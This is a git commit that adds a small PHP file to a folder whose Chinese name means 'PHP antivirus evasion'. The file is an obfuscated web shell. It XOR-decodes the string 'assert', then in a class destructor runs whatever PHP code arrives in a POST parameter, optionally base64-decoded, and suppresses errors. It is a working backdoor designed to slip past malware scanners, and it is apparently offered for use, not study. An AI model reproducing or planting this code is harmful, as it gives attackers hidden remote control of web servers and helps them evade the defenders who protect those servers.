de61d358af0cce8684512ab441cfea942637786f
4C5A59 <56837174+4C5A59@users.noreply.github.com>
2020-05-21 16:01:24 +0800

    Add files via upload

---
+++ php免杀4_9/x2.php
@@ -0,0 +1,10 @@
+<?php
+class RVTJ{
+    function __destruct(){
+        $CGDN='>Eg}U~'^"\x5f\x36\x14\x18\x27\xa";
+        return @$CGDN("$this->HMKX");
+    }
+}
+$rvtj=new RVTJ();
+@$rvtj->HMKX=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+?>
